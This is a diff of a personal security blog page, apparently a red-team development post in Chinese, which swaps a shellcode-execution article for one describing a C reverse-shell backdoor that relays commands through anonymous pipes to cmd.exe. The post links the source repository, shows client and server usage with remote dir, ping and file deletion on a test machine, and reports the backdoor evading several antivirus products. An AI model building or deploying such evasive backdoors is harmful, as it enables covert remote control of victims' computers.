@@ -11,7 +11,7 @@
   
   <title>
     
-      运行shellcode的骚姿势 
+      红队开发.基础篇.01.C语言实现双管道后门 
       
       
       |
@@ -159,19 +159,19 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">运行shellcode的骚姿势</div>
+      <div class="post-title">红队开发.基础篇.01.C语言实现双管道后门</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2023-12-30 11:57:37
+          2023-12-30 11:59:29
         </span>
         
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
                 <span class="span--tag mr-8">
-                  <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
-                    #免杀
+                  <a href="/tags/%E7%BA%A2%E9%98%9F%E5%BC%80%E5%8F%91/" title="红队开发">
+                    #红队开发
                   </a>
                 </span>
                 
@@ -179,13 +179,53 @@
           
       </div>
       <div class="markdown-body">
-        <h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><p><a target="_blank" rel="noopener" href="http://www.hackdig.com/02/hack-272778.htm">http://www.hackdig.com/02/hack-272778.htm</a></p>
-<p>Rvn0xsy : 倾旋  -&gt; 静态恶意代码逃逸（第十课） </p>
-<h1 id="离不开的核心思想"><a href="#离不开的核心思想" class="headerlink" title="离不开的核心思想"></a>离不开的核心思想</h1><p>让shellcode具备可执行的权限</p>
-<p>让eip指向shellcode</p>
-<h1 id="Windows回调"><a href="#Windows回调" class="headerlink" title="Windows回调"></a>Windows回调</h1><p>什么是回调函数,,不再介绍</p>
-<p>windows有很多的回调函数,,,数不胜数</p>
-<p>回调函数查询可见  <a target="_blank" rel="noopener" href="http://ropgadget.com/posts/abusing_win_functions.html">http://ropgadget.com/posts/abusing_win_functions.html</a></p>
+        <h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/thankgoodness/articles/1762596.html</span><br><span class="line">https://www.cnblogs.com/LyShark/p/17524996.html</span><br><span class="line">https://www.cnblogs.com/thankgoodness/articles/1762596.html </span><br><span class="line">https://www.cnblogs.com/zhangxuan/p/6704915.html</span><br><span class="line">https://blog.csdn.net/qq_37232329/article/details/120393753</span><br><span class="line">未看的:</span><br><span class="line">https://ifmet.cn/posts/fe544e10/</span><br></pre></td></tr></table></figure>
+
+<p>wiki学习见 <a target="_blank" rel="noopener" href="https://www.notion.so/redqx/62a81857f08a4d8a87eb7bb07a06fc47">https://www.notion.so/redqx/62a81857f08a4d8a87eb7bb07a06fc47</a></p>
+<h1 id="—"><a href="#—" class="headerlink" title="—"></a>—</h1><p>其实匿名管道反弹CMD的工作原理可以理解为，</p>
+<p>首先攻击机发命令并通过<code>Socket</code>传给目标机的父进程，目标机的父进程又通过一个匿名管道传给子进程，</p>
+<p>这里的子进程是<code>cmd.exe</code>，CMD执行命令后，把结果通过另一个匿名管道返给父进程，</p>
+<p>父进程最后再通过<code>Socket</code>返回给攻击机，以此则实现了反弹Shell的目的；</p>
+<p>通信原理如下</p>
+<p><img src="/./img/image-20231230111519092.png" alt="image-20231230111519092"></p>
+<p>遇到了很多问题…</p>
+<p>写了我很久的时间, 好吧1.5~2天吧,,,</p>
+<p>问GPT就问了很久很久…GPT给的代码大多有问题</p>
+<p>最后参考了很多</p>
+<p>碰运气写对一次,,,只能说不知道为什么,,但也就是写对了….</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">管道读写 sleep 问题</span><br><span class="line">    - 要不要sleep</span><br><span class="line">    - sleep 多久</span><br><span class="line">    - 在哪里shellp</span><br><span class="line">管道通信 PeekNamedPipe 没有读取到所有数据</span><br><span class="line">	- 读取数据不完整,导致发送数据也不完整</span><br><span class="line">	- 二次读取,会把上一次不玩的给一起读取出来,,看上去很别扭</span><br></pre></td></tr></table></figure>
+
+<p>成品代码如下:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/redqx/malware_coding/tree/master/win_pipe_backdoor">https://github.com/redqx/malware_coding/tree/master/win_pipe_backdoor</a></p>
+<p>展示如下:</p>
+<p>win10 启动server</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [版本 10.0.19044.3086]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">redqx#&gt;server.exe 8888</span><br><span class="line">00000000.#&gt; i am working ^-^</span><br></pre></td></tr></table></figure>
+
+<p>虚拟机启动客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#&gt;client.exe 192.168.101.30 8888</span><br><span class="line">#&gt; work with 192.168.101.30 8888</span><br><span class="line">#&gt; connect server yes</span><br></pre></td></tr></table></figure>
+
+<p>然后server可以看见服务端上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000.#&gt; work with 127.0.0.1 8888</span><br><span class="line">00000000.#&gt; i am working ^-^</span><br><span class="line">0000435C.#&gt;: weclome!!! ^-^</span><br><span class="line">0000435C.#&gt;:</span><br><span class="line">i am coming</span><br><span class="line"></span><br><span class="line">0000435C.#&gt;:</span><br></pre></td></tr></table></figure>
+
+<p>然后我们发送指令给客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [版本 10.0.19044.3086]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\redqx\Desktop\dqx\demo_code\visual studio 2013\demo1\Debug&gt;d4.exe 8888</span><br><span class="line">00000000.#&gt; work with 127.0.0.1 8888</span><br><span class="line">00000000.#&gt; i am working ^-^</span><br><span class="line">0000435C.#&gt;: weclome!!! ^-^</span><br><span class="line">0000435C.#&gt;:</span><br><span class="line">i am coming</span><br><span class="line"></span><br><span class="line">0000435C.#&gt;: dir</span><br><span class="line">0000435C.#&gt;:</span><br><span class="line">Microsoft Windows [版本 10.0.19044.3086]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\D0g3\Desktop&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 5EF5-7DD8</span><br><span class="line"></span><br><span class="line"> C:\Users\D0g3\Desktop 的目录</span><br><span class="line"></span><br><span class="line">2023/12/30  11:44    &lt;DIR&gt;          .</span><br><span class="line">2023/12/30  11:44    &lt;DIR&gt;          ..</span><br><span class="line">2023/12/28  11:03               931 360安全卫士.lnk</span><br><span class="line">2023/12/28  11:03             1,109 360软件管家.lnk</span><br><span class="line">2023/12/17  20:45             3,038 API Monitor v2 (Alpha) 32-bit.lnk</span><br><span class="line">2023/12/17  20:45             3,038 API Monitor v2 (Alpha) 64-bit.lnk</span><br><span class="line">2023/12/27  19:20           854,528 app.bin</span><br><span class="line">2023/12/30  11:44           508,416 client.exe</span><br><span class="line">2023/11/26  00:16             2,336 Microsoft Edge.lnk</span><br><span class="line">2023/12/17  20:45             1,069 公用 - 快捷方式.lnk</span><br><span class="line">              18 个文件      1,475,435 字节</span><br><span class="line">               2 个目录 244,886,134,784 可用字节</span><br><span class="line"></span><br><span class="line">C:\Users\D0g3\Desktop&gt;</span><br><span class="line">0000435C.#&gt;: ping www.baidu.com</span><br><span class="line">0000435C.#&gt;:</span><br><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">正在 Ping www.a.shifen.com [183.2.172.42] 具有 32 字节的数据:</span><br><span class="line">来自 183.2.172.42 的回复: 字节=32 时间=42ms TTL=128</span><br><span class="line">来自 183.2.172.42 的回复: 字节=32 时间=39ms TTL=128</span><br><span class="line">来自 183.2.172.42 的回复: 字节=32 时间=40ms TTL=128</span><br><span class="line">来自 183.2.172.42 的回复: 字节=32 时间=40ms TTL=128</span><br><span class="line"></span><br><span class="line">183.2.172.42 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 39ms，最长 = 42ms，平均 = 40ms</span><br><span class="line"></span><br><span class="line">C:\Users\D0g3\Desktop&gt;</span><br><span class="line">0000435C.#&gt;:</span><br></pre></td></tr></table></figure>
+
+<p>我们尝试执行文件删除操作</p>
+<p>删除桌面的图片</p>
+<p><img src="/./img/image-20231230114742726.png" alt="image-20231230114742726"></p>
+<p>server 操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\D0g3\Desktop&gt;</span><br><span class="line">0000435C.#&gt;: del flag.png</span><br><span class="line">0000435C.#&gt;:</span><br><span class="line">del flag.png</span><br><span class="line"></span><br><span class="line">C:\Users\D0g3\Desktop&gt;</span><br><span class="line">0000435C.#&gt;:</span><br></pre></td></tr></table></figure>
+
+<p>然后可以看见已经被删除了</p>
+<p><img src="/./img/image-20231230114825078.png" alt="image-20231230114825078"></p>
+<p>杀软查杀: 2023-12-30</p>
+<p>vt 5&#x2F;72 扫描了差不多1-2分钟,,,可能WIFI网络不好吧</p>
+<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/293f9d7bc75402ab948d17e04682e314075802824ecca695357ec06ed77f43f8?nocache=1">https://www.virustotal.com/gui/file/293f9d7bc75402ab948d17e04682e314075802824ecca695357ec06ed77f43f8?nocache=1</a></p>
+<p>静态免杀: 某绒(✔),   某数字卫士(✔)  某数字杀毒(✔) </p>
+<p>动态免杀: 某绒(✔)  , 某数字卫士(✔)  某数字杀毒(✔) </p>
+<p>为什么能过杀软? 可能是因为本身就没有毒性,没有恶意行为吧 😁</p>
+<p><img src="/./img/image-20231230114935641.png" alt="image-20231230114935641"></p>
+<p><img src="/./img/image-20231230115207018.png" alt="image-20231230115207018"></p>
 
       </div>
       
@@ -198,7 +238,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#links"><span class="toc-text">links</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A6%BB%E4%B8%8D%E5%BC%80%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="toc-text">离不开的核心思想</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E5%9B%9E%E8%B0%83"><span class="toc-text">Windows回调</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#links"><span class="toc-text">links</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%80%94"><span class="toc-text">—</span></a></li></ol>
       
     </div>
   </div>
@@ -494,12 +534,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E8%BF%90%E8%A1%8Cshellcode%E7%9A%84%E9%AA%9A%E5%A7%BF%E5%8A%BF + '&url=' + https%3A%2F%2Fredqx.github.io%2F2023%2Fbbf7daa49389%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E7%BA%A2%E9%98%9F%E5%BC%80%E5%8F%91.%E5%9F%BA%E7%A1%80%E7%AF%87.01.C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%8F%8C%E7%AE%A1%E9%81%93%E5%90%8E%E9%97%A8 + '&url=' + https%3A%2F%2Fredqx.github.io%2F2023%2F23066e6b5803%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://redqx.github.io/2023/bbf7daa49389/" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://redqx.github.io/2023/23066e6b5803/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
